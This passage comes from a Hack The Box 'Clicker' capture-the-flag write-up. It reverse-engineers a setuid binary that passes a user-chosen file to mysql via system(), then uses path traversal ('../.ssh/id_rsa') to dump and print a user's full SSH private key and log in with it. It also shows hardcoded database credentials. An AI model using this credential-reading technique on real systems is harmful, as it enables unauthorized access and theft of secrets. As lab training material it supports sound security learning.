+<span class="n">pread64</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">"</span><span class="se">\6\0\0\0\4\0\0\0</span><span class="s2">@</span><span class="se">\0\0\0\0\0\0\0</span><span class="s2">@</span><span class="se">\0\0\0\0\0\0\0</span><span class="s2">@</span><span class="se">\0\0\0\0\0\0\0</span><span class="s2">"</span><span class="o">...</span><span class="p">,</span> <span class="mi">784</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span> <span class="o">=</span> <span class="mi">784</span>
+<span class="n">mmap</span><span class="p">(</span><span class="n">NULL</span><span class="p">,</span> <span class="mi">2260560</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_DENYWRITE</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x7f920b0ab000</span>
+<span class="n">mmap</span><span class="p">(</span><span class="mh">0x7f920b0d3000</span><span class="p">,</span> <span class="mi">1658880</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_DENYWRITE</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x28000</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x7f920b0d3000</span>
+<span class="n">mmap</span><span class="p">(</span><span class="mh">0x7f920b268000</span><span class="p">,</span> <span class="mi">360448</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_DENYWRITE</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x1bd000</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x7f920b268000</span>
+<span class="n">mmap</span><span class="p">(</span><span class="mh">0x7f920b2c0000</span><span class="p">,</span> <span class="mi">24576</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_DENYWRITE</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x214000</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x7f920b2c0000</span>
+<span class="n">mmap</span><span class="p">(</span><span class="mh">0x7f920b2c6000</span><span class="p">,</span> <span class="mi">52816</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x7f920b2c6000</span>
+<span class="n">close</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>                                <span class="o">=</span> <span class="mi">0</span>
+<span class="n">mmap</span><span class="p">(</span><span class="n">NULL</span><span class="p">,</span> <span class="mi">12288</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x7f920b0a8000</span>
+<span class="n">arch_prctl</span><span class="p">(</span><span class="n">ARCH_SET_FS</span><span class="p">,</span> <span class="mh">0x7f920b0a8740</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">set_tid_address</span><span class="p">(</span><span class="mh">0x7f920b0a8a10</span><span class="p">)</span>         <span class="o">=</span> <span class="mi">1557</span>
+<span class="n">set_robust_list</span><span class="p">(</span><span class="mh">0x7f920b0a8a20</span><span class="p">,</span> <span class="mi">24</span><span class="p">)</span>     <span class="o">=</span> <span class="mi">0</span>
+<span class="n">rseq</span><span class="p">(</span><span class="mh">0x7f920b0a90e0</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x53053053</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">mprotect</span><span class="p">(</span><span class="mh">0x7f920b2c0000</span><span class="p">,</span> <span class="mi">16384</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">mprotect</span><span class="p">(</span><span class="mh">0x562204d99000</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">mprotect</span><span class="p">(</span><span class="mh">0x7f920b313000</span><span class="p">,</span> <span class="mi">8192</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">prlimit64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">RLIMIT_STACK</span><span class="p">,</span> <span class="n">NULL</span><span class="p">,</span> <span class="p">{</span><span class="n">rlim_cur</span><span class="o">=</span><span class="mi">8192</span><span class="o">*</span><span class="mi">1024</span><span class="p">,</span> <span class="n">rlim_max</span><span class="o">=</span><span class="n">RLIM64_INFINITY</span><span class="p">})</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">munmap</span><span class="p">(</span><span class="mh">0x7f920b2d3000</span><span class="p">,</span> <span class="mi">21007</span><span class="p">)</span>           <span class="o">=</span> <span class="mi">0</span>
+<span class="n">getrandom</span><span class="p">(</span><span class="s2">"</span><span class="se">\x51\xc6\xfc\x1d\x49\xaf\x45\xd6</span><span class="s2">"</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">GRND_NONBLOCK</span><span class="p">)</span> <span class="o">=</span> <span class="mi">8</span>
+<span class="n">brk</span><span class="p">(</span><span class="n">NULL</span><span class="p">)</span>                               <span class="o">=</span> <span class="mh">0x562205129000</span>
+<span class="n">brk</span><span class="p">(</span><span class="mh">0x56220514a000</span><span class="p">)</span>                     <span class="o">=</span> <span class="mh">0x56220514a000</span>
+<span class="n">setreuid</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span> <span class="mi">1000</span><span class="p">)</span>                    <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="n">EPERM</span> <span class="p">(</span><span class="n">Operation</span> <span class="ow">not</span> <span class="n">permitted</span><span class="p">)</span>
+<span class="n">access</span><span class="p">(</span><span class="s2">"/home/jack/queries/create.sql"</span><span class="p">,</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="n">EACCES</span> <span class="p">(</span><span class="n">Permission</span> <span class="n">denied</span><span class="p">)</span>
+<span class="n">newfstatat</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="p">{</span><span class="n">st_mode</span><span class="o">=</span><span class="n">S_IFCHR</span><span class="o">|</span><span class="mi">0620</span><span class="p">,</span> <span class="n">st_rdev</span><span class="o">=</span><span class="n">makedev</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="o">...</span><span class="p">},</span> <span class="n">AT_EMPTY_PATH</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">"File not readable or not found</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="mi">31</span><span class="n">File</span> <span class="ow">not</span> <span class="n">readable</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">found</span>
+<span class="p">)</span> <span class="o">=</span> <span class="mi">31</span>
+<span class="n">exit_group</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                           <span class="o">=</span> <span class="err">?</span>
+<span class="o">+++</span> <span class="n">exited</span> <span class="k">with</span> <span class="mi">0</span> <span class="o">+++</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage$</span>
+</pre></div>
+
+It is attempting to access a file named <code>create.sql</code>, which is located in <code>/home/jack/queries</code>.<br/><br/>
+I was able to exploit this binary without using reverse engineering methods or tools like <code>ghidra</code>. However, for the write-up, I will explain how the binary works.<br/><br/>
+Let's launch Ghidra and analyze this binary on my local machine:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/38.png"/><br/><br/>
+Firstly, it checks whether the program is executed with arguments:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/39.png"/><br/><br/>
+In the event that we execute the program with an argument, this happens:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/40.png"/><br/><br/>
+Firstly, it is defining the <code>iVar1</code> variable with the content of the first argument specified in the command line.<br/><br/>
+Then, the code dynamically allocates memory for a block of 20 bytes (0x14 in hexadecimal) using the <code>calloc</code> function. The allocated memory is initialized to zeros. The pointer <code>pcVar3</code> points to the first byte of this newly assigned memory.<br/><br/>
+Upon reaching the <code>switch()</code> statement, it examines the content of the first argument (stored in the <code>iVar1</code> variable).<br/><br/>
+If the first argument equals <code>1</code>, the following events occur:<br/><br/>
+The <code>strncpy</code> function is used to copy a specified number of characters from one string to another.<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">strncpy</span><span class="p">(</span><span class="n">pcVar3</span><span class="p">,</span><span class="w"> </span><span class="s">"create.sql"</span><span class="p">,</span><span class="w"> </span><span class="mh">0x14</span><span class="p">);</span>
+</pre></div>
+<ul>
+<li><code>pcVar3</code>: This is a pointer to the destination buffer where the characters will be copied.</li>
+<li><code>"create.sql"</code>: This is the source string from which characters will be copied.</li>
+<li><code>0x14</code>: This is the maximum number of characters to be copied.</li>
+</ul>
+In this specific case, the code is copying the characters from the string "create.sql" to the memory block pointed to by <code>pcVar3</code>. It will copy up to 0x14 (20 in decimal) characters. If the source string is shorter than 20 characters, the remaining space in the destination buffer will be filled with null characters ('\0').<br/><br/>
+The code for cases 1, 2, 3, and 4 is similar. Let's examine what happens in the default case:<br/><br/>
+<div class="highlight"><pre><span></span><span class="n">strncpy</span><span class="p">(</span><span class="n">pcVar3</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="n">param_2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x10</span><span class="p">),</span><span class="mh">0x14</span><span class="p">);</span>
+</pre></div>
+
+Essentially, this implies that the value of the second parameter specified in the command line when launching the program is stored in <code>pcVar3</code>, which points to the block of 20 bytes defined using the <code>calloc</code> function. It's crucial to note that the second parameter must not exceed 20 bytes in length.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/42.png"/><br/><br/>
+It was a little challenging to comprehend this code due to the strings not being in plaintext. Essentially, the values of three variables, namely <code>local_98</code>, <code>local_90</code>, and <code>local_88</code>, correspond to the string <code>/home/jack/queries/</code>.<br/><br/>
+In summary, this code concatenates the string stored in the <code>pcVar3</code> variable with the <code>/home/jack/queries</code> string and stores the resulting string in the <code>__dest</code> variable. Subsequently, it uses the <code>setreuid()</code> function to set both the RUID (Real User Identifier) and EUID (Effective User Identifier) to 1000 (associated with user <code>Jack</code>). Finally, it checks if the file (whose location is stored in the <code>__dest</code> variable) is readable using the <code>access()</code> function. The value <code>4</code> corresponds to read privileges.<br/><br/>
+In the event that the file is readable, this happens:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/44.png"/><br/><br/>
+Once again, the strings are not in plain text, but these variables belong to the following command:<br/><br/>
+<div class="highlight"><pre><span></span>/usr/bin/mysql<span class="w"> </span>-u<span class="w"> </span>clicker_db_user<span class="w"> </span>--password<span class="o">=</span><span class="s1">'clicker_db_password'</span><span class="w"> </span>clicker<span class="w"> </span>-v<span class="w"> </span>&lt;
+</pre></div>
+
+Calculates the length of the string pointed to by <code>local_78</code> (the MySQL command) using the <code>strlen</code> function and stores the result in <code>sVar4</code>.<br/><br/>
+Calculates the length of the string pointed to by <code>pcVar3</code> using the <code>strlen</code> function and stores the result in <code>sVar5</code>.<br/><br/>
+Dynamically allocates memory for a new string (<code>pcVar3</code>) with a size that is the sum of the lengths of <code>local_78</code> and <code>__dest</code>, plus 1 (for the null character at the end).<br/><br/>
+Concatenates the string <code>local_78</code> at the beginning of the string <code>pcVar3</code> using the <code>strcat</code> function.<br/><br/>
+Concatenates the string <code>__dest</code> at the end of the string <code>pcVar3</code> using the <code>strcat</code> function.<br/><br/>
+Executes the command specified by the string <code>pcVar3</code> using the <code>system</code> function.<br/><br/>
+This implies that the content of the file is passed to the SQL query executed in the system command. As we have seen previously, in the default case, we could specify any file we want. The issue arises when our string entered in the second argument is concatenated with the string <code>/home/jack/queries/</code>. Nonetheless, this is not a problem as we can leverage Directory Path Traversal to navigate back through directories. Although the 20-byte limitation makes exploitation more challenging, we can attempt to move back one directory and read the <code>.ssh/id_rsa</code> file. This endeavor could grant us access as <code>Jack</code> through SSH.<br/><br/>
+Given that MySQL is executed with the <code>-v</code> parameter, the file content will be visible in the output of the command. It's crucial to note that without this parameter, the described approach may not work as expected. That's why we observe the following output when launching the program and specifying <code>1</code> as a parameter:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage$</span> <span class="o">./</span><span class="n">execute_query</span> <span class="mi">1</span>
+<span class="n">mysql</span><span class="p">:</span> <span class="p">[</span><span class="ne">Warning</span><span class="p">]</span> <span class="n">Using</span> <span class="n">a</span> <span class="n">password</span> <span class="n">on</span> <span class="n">the</span> <span class="n">command</span> <span class="n">line</span> <span class="n">interface</span> <span class="n">can</span> <span class="n">be</span> <span class="n">insecure</span><span class="o">.</span>
+<span class="o">--------------</span>
+<span class="n">CREATE</span> <span class="n">TABLE</span> <span class="n">IF</span> <span class="n">NOT</span> <span class="n">EXISTS</span> <span class="n">players</span><span class="p">(</span><span class="n">username</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">nickname</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">password</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">role</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">clicks</span> <span class="n">bigint</span><span class="p">,</span> <span class="n">level</span> <span class="nb">int</span><span class="p">,</span> <span class="n">PRIMARY</span> <span class="n">KEY</span> <span class="p">(</span><span class="n">username</span><span class="p">))</span>
+<span class="o">--------------</span>
+
+<span class="o">--------------</span>
+<span class="n">INSERT</span> <span class="n">INTO</span> <span class="n">players</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">nickname</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">role</span><span class="p">,</span> <span class="n">clicks</span><span class="p">,</span> <span class="n">level</span><span class="p">)</span> 
+    <span class="n">VALUES</span> <span class="p">(</span><span class="s1">'admin'</span><span class="p">,</span> <span class="s1">'admin'</span><span class="p">,</span> <span class="s1">'ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82'</span><span class="p">,</span> <span class="s1">'Admin'</span><span class="p">,</span> <span class="mi">999999999999999999</span><span class="p">,</span> <span class="mi">999999999</span><span class="p">)</span>
+    <span class="n">ON</span> <span class="n">DUPLICATE</span> <span class="n">KEY</span> <span class="n">UPDATE</span> <span class="n">username</span><span class="o">=</span><span class="n">username</span>
+<span class="o">--------------</span>
+
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage$</span>
+</pre></div>
+
+This should be the content of the <code>create.sql</code> file, as we have seen in the source code.<br/><br/>
+Let's attempt to read the <code>id_rsa</code> key of <code>Jack</code>. Firstly, we need to specify any number different from 0, 1, 2, 3, or 4, as these correspond to cases in the switch statement in the program. We can pass <code>5</code> as the first argument and <code>../.ssh/id_rsa</code> as the second argument:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage$</span> <span class="o">./</span><span class="n">execute_query</span> <span class="mi">5</span> <span class="s1">'../.ssh/id_rsa'</span>
+<span class="n">mysql</span><span class="p">:</span> <span class="p">[</span><span class="ne">Warning</span><span class="p">]</span> <span class="n">Using</span> <span class="n">a</span> <span class="n">password</span> <span class="n">on</span> <span class="n">the</span> <span class="n">command</span> <span class="n">line</span> <span class="n">interface</span> <span class="n">can</span> <span class="n">be</span> <span class="n">insecure</span><span class="o">.</span>
+<span class="o">--------------</span>
+<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">OPENSSH</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">---</span>
+<span class="n">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="n">NhAAAAAwEAAQAAAYEAs4eQaWHe45iGSieDHbraAYgQdMwlMGPt50KmMUAvWgAV2zlP8</span><span class="o">/</span><span class="mi">1</span><span class="n">Y</span>
+<span class="n">J</span><span class="o">/</span><span class="n">tSzgoR9Fko8I1UpLnHCLz2Ezsb</span><span class="o">/</span><span class="n">MrLCe8nG5TlbJrrQ4HcqnS4TKN7DZ7XW0bup3ayy1</span>
+<span class="n">kAAZ9Uot6ep</span><span class="o">/</span><span class="n">ekM8E</span><span class="o">+</span><span class="mi">7</span><span class="o">/</span><span class="mi">39</span><span class="n">VZ5fe1FwZj4iRKI</span><span class="o">+</span><span class="n">g</span><span class="o">/</span><span class="n">BVQFclsgK02B594GkOz33P</span><span class="o">/</span><span class="n">Zzte2jV</span>
+<span class="n">Tgmy3</span><span class="o">+</span><span class="n">htPE5My31i2lXh6XWfepiBOjG</span><span class="o">+</span><span class="n">mQDg2OySAphbO1SbMisowP1aSexKMh7Ir6IlPu</span>
+<span class="n">nuw3l</span><span class="o">/</span><span class="n">luyvRGDN8fyumTeIXVAdPfOqMqTOVECo7hAoY</span><span class="o">+</span><span class="n">uYWKfiHxOX4fo</span><span class="o">+/</span><span class="n">fNwdcfctBUm</span>
+<span class="n">pr5Nxx0GCH1wLnHsbx</span><span class="o">+/</span><span class="n">oBkPzxuzd</span><span class="o">+</span><span class="n">BcGNZp7FP8cn</span><span class="o">+</span><span class="n">dEFz2ty8Ls0Mr</span><span class="o">+</span><span class="n">XW5ofivEwr3</span><span class="o">+</span><span class="n">e</span>
+<span class="mi">30</span><span class="n">OgtpL6QhO2eLiZVrIXOHiPzW49emv4xhuoPF3E</span><span class="o">/</span><span class="mi">5</span><span class="n">CA6akeQbbGAppTi</span><span class="o">+</span><span class="n">EBG9Lhr04c9E</span>
+<span class="mi">2</span><span class="n">uCSLPiZqHiViArcUbbXxWMX2NPSJzDsQ4xeYqFtAAAFiO2Fee3thXntAAAAB3NzaC1yc2</span>
+<span class="n">EAAAGBALOHkGlh3uOYhkongx262gGIEHTMJTBj7edCpjFAL1oAFds5T</span><span class="o">/</span><span class="n">P9WCf7Us4KEfRZ</span>
+<span class="n">KPCNVKS5xwi89hM7G</span><span class="o">/</span><span class="n">zKywnvJxuU5Wya60OB3Kp0uEyjew2e11tG7qd2sstZAAGfVKLenq</span>
+<span class="n">f3pDPBPu</span><span class="o">/</span><span class="mi">9</span><span class="o">/</span><span class="n">VWeX3tRcGY</span><span class="o">+</span><span class="n">IkSiPoPwVUBXJbICtNgefeBpDs99z</span><span class="o">/</span><span class="mi">2</span><span class="n">c7Xto1U4Jst</span><span class="o">/</span><span class="n">obTxO</span>
+<span class="n">TMt9YtpV4el1n3qYgToxvpkA4NjskgKYWztUmzIrKMD9WknsSjIeyK</span><span class="o">+</span><span class="n">iJT7p7sN5f5bsr0</span>
+<span class="n">RgzfH8rpk3iF1QHT3zqjKkzlRAqO4QKGPrmFin4h8Tl</span><span class="o">+</span><span class="n">H6Pv3zcHXH3LQVJqa</span><span class="o">+</span><span class="n">TccdBgh9</span>
+<span class="n">cC5x7G8fv6AZD88bs3fgXBjWaexT</span><span class="o">/</span><span class="n">HJ</span><span class="o">/</span><span class="n">nRBc9rcvC7NDK</span><span class="o">/</span><span class="n">l1uaH4rxMK9</span><span class="o">/</span><span class="n">nt9DoLaS</span><span class="o">+</span><span class="n">kIT</span>
+<span class="n">tni4mVayFzh4j81uPXpr</span><span class="o">+</span><span class="n">MYbqDxdxP</span><span class="o">+</span><span class="n">QgOmpHkG2xgKaU4vhARvS4a9OHPRNrgkiz4mah4</span>
+<span class="n">lYgK3FG218VjF9jT0icw7EOMXmKhbQAAAAMBAAEAAAGACLYPP83L7uc7vOVl609hvKlJgy</span>
+<span class="n">FUvKBcrtgBEGq44XkXlmeVhZVJbcc4IV9Dt8OLxQBWlxecnMPufMhld0Kvz2</span><span class="o">+</span><span class="n">XSjNTXo21</span>
+<span class="mi">1</span><span class="n">LS8bFj1iGJ2WhbXBErQ0bdkvZE3</span><span class="o">+</span><span class="n">twsUyrSL</span><span class="o">/</span><span class="n">xIL2q1DxgX7sucfnNZLNze9M2akvRabq</span>
+<span class="n">DL53NSKxpvqS</span><span class="o">/</span><span class="n">v1AmaygePTmmrz</span><span class="o">/</span><span class="n">mQgGTayA5Uk5sl7Mo2CAn5Dw3PV2</span><span class="o">+</span><span class="n">KfAoa3uu7ufyC</span>
+<span class="n">kMJuNWT6uUKR2vxoLT5pEZKlg8Qmw2HHZxa6wUlpTSRMgO</span><span class="o">+</span><span class="n">R</span><span class="o">+</span><span class="n">xEQsemUFy0vCh4TyezD3i</span>
+<span class="n">SlyE8yMm8gdIgYJB</span><span class="o">+</span><span class="n">FP5m4eUyGTjTE4</span><span class="o">+</span><span class="n">lhXOKgEGPcw9</span><span class="o">+</span><span class="n">MK7Li05Kbgsv</span><span class="o">/</span><span class="n">ZwuLiI8UNAhc</span>
+<span class="mi">9</span><span class="n">vgmEfs</span><span class="o">/</span><span class="n">hoiZPX6fpG</span><span class="o">+</span><span class="n">u4L82oKJuIbxF</span><span class="o">/</span><span class="n">I2Q2YBNIP9O9qVLdxUniEUCNl3BOAk</span><span class="o">/</span><span class="mi">8</span><span class="n">H6usN</span>
+<span class="mi">9</span><span class="n">pLG5kIalMYSl6lMnfethUiUrTZzATPYT1xZzQCdJ</span><span class="o">+</span><span class="n">qagLrl7O33aez3B</span><span class="o">/</span><span class="n">OAUrYmsBAAAA</span>
+<span class="n">wQDB7xyKB85</span><span class="o">+</span><span class="n">On0U9Qk1jS85dNaEeSBGb7Yp4e</span><span class="o">/</span><span class="n">oQGiHquN</span><span class="o">/</span><span class="n">xBgaZzYTEO7WQtrfmZMM4s</span>
+<span class="n">SXT5qO0J8TBwjmkuzit3</span><span class="o">/</span><span class="n">BjrdOAs8n2Lq8J0sPcltsMnoJuZ3Svqclqi8WuttSgKPyhC4s</span>
+<span class="n">FQsp6ggRGCP64C8N854</span><span class="o">//</span><span class="n">KuxhTh5UXHmD7</span><span class="o">+</span><span class="n">teKGdbi9MjfDygwk</span><span class="o">+</span><span class="n">gQ33YIr2KczVgdltwW</span>
+<span class="n">EhA8zfl5uimjsT31lks3jwk</span><span class="o">/</span><span class="n">I8CupZGrVvXmyEzBYZBegl3W4AAADBAO19sPL8ZYYo1n2j</span>
+<span class="n">rghoSkgwA8kZJRy6BIyRFRUODsYBlK0ItFnriPgWSE2b3iHo7cuujCDju0yIIfF2QG87Hh</span>
+<span class="n">zXj1wghocEMzZ3ELIlkIDY8BtrewjC3CFyeIY3XKCY5AgzE2ygRGvEL</span><span class="o">+</span><span class="n">YFLezLqhJseV8j</span>
+<span class="mi">3</span><span class="n">kOhQ3D6boridyK3T66YGzJsdpEvWTpbvve3FM5pIWmA5LUXyihP2F7fs2E5aDBUuLJeyi</span>
+<span class="n">F0YCoftLetCA</span><span class="o">/</span><span class="n">kiVtqlT0trgO8Yh</span><span class="o">+</span><span class="mi">78</span><span class="n">QAAAMEAwYV0GjQs3AYNLMGccWlVFoLLPKGItynr</span>
+<span class="n">Xxa</span><span class="o">/</span><span class="n">j3qOBZ</span><span class="o">+</span><span class="n">HiMsXtZdpdrV26N43CmiHRue4SWG1m</span><span class="o">/</span><span class="n">Vh3zezxNymsQrp6sv96vsFjM7gAI</span>
+<span class="n">JJK</span><span class="o">+</span><span class="n">Ds3zu2NNNmQ82gPwc</span><span class="o">/</span><span class="n">wNM3TatS</span><span class="o">/</span><span class="n">Oe4loqHg3nDn5CEbPtgc8wkxheKARAz0SbztcJC</span>
+<span class="n">LsOxRu230Ti7tRBOtV153KHlE4Bu7G</span><span class="o">/</span><span class="n">d028dbQhtfMXJLu96W1l3Fr98pDxDSFnig2HMIi</span>
+<span class="n">lL4gSjpD</span><span class="o">/</span><span class="n">FjWk9AAAADGphY2tAY2xpY2tlcgECAwQFBg</span><span class="o">==</span>
+<span class="o">-----</span><span class="n">END</span> <span class="n">OPENSSH</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">---</span>
+<span class="o">--------------</span>
+
+<span class="n">ERROR</span> <span class="mi">1064</span> <span class="p">(</span><span class="mi">42000</span><span class="p">)</span> <span class="n">at</span> <span class="n">line</span> <span class="mi">1</span><span class="p">:</span> <span class="n">You</span> <span class="n">have</span> <span class="n">an</span> <span class="n">error</span> <span class="ow">in</span> <span class="n">your</span> <span class="n">SQL</span> <span class="n">syntax</span><span class="p">;</span> <span class="n">check</span> <span class="n">the</span> <span class="n">manual</span> <span class="n">that</span> <span class="n">corresponds</span> <span class="n">to</span> <span class="n">your</span> <span class="n">MySQL</span> <span class="n">server</span> <span class="n">version</span> <span class="k">for</span> <span class="n">the</span> <span class="n">right</span> <span class="n">syntax</span> <span class="n">to</span> <span class="n">use</span> <span class="n">near</span> <span class="s1">'-----BEGIN OPENSSH PRIVATE KEY---</span>
+<span class="n">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA</span><span class="s1">' at line 1</span>
+<span class="nd">www-data@clicker</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">manage$</span>
+</pre></div>
+
+Finally, we have successfully read Jack's <code>id_rsa</code>. I will copy it into a file on my local machine and assign it <code>600</code> privileges. Please note that the output requires correction; the id_rsa is not well-formatted. We need to add some <code>-</code> characters in the key limits:<br/><br/>
+<div class="highlight"><pre><span></span>-----BEGIN OPENSSH PRIVATE KEY-----
+-----END OPENSSH PRIVATE KEY-----
+</pre></div>
+
+Before using it as an authentication method, we need to assign it <code>600</code> privileges:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">chmod</span> <span class="mi">600</span> <span class="n">id_rsa_jack</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">id_rsa</span> <span class="n">jack</span><span class="o">@</span><span class="mf">10.10.11.232</span>
+<span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04.3</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15.0</span><span class="o">-</span><span class="mi">84</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
+
+ <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span>
+ <span class="o">*</span> <span class="n">Management</span><span class="p">:</span>     <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">landscape</span><span class="o">.</span><span class="n">canonical</span><span class="o">.</span><span class="n">com</span>
+ <span class="o">*</span> <span class="n">Support</span><span class="p">:</span>        <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">advantage</span>
+
+  <span class="n">System</span> <span class="n">information</span> <span class="k">as</span> <span class="n">of</span> <span class="n">Tue</span> <span class="n">Jan</span> <span class="mi">23</span> <span class="mi">01</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">52</span> <span class="n">PM</span> <span class="n">UTC</span> <span class="mi">2024</span>
+
+  <span class="n">System</span> <span class="n">load</span><span class="p">:</span>           <span class="mf">0.0087890625</span>
+  <span class="n">Usage</span> <span class="n">of</span> <span class="o">/</span><span class="p">:</span>            <span class="mf">53.3</span><span class="o">%</span> <span class="n">of</span> <span class="mf">5.77</span><span class="n">GB</span>
+  <span class="n">Memory</span> <span class="n">usage</span><span class="p">:</span>          <span class="mi">19</span><span class="o">%</span>
+  <span class="n">Swap</span> <span class="n">usage</span><span class="p">:</span>            <span class="mi">0</span><span class="o">%</span>
+  <span class="n">Processes</span><span class="p">:</span>             <span class="mi">248</span>
+  <span class="n">Users</span> <span class="n">logged</span> <span class="ow">in</span><span class="p">:</span>       <span class="mi">0</span>
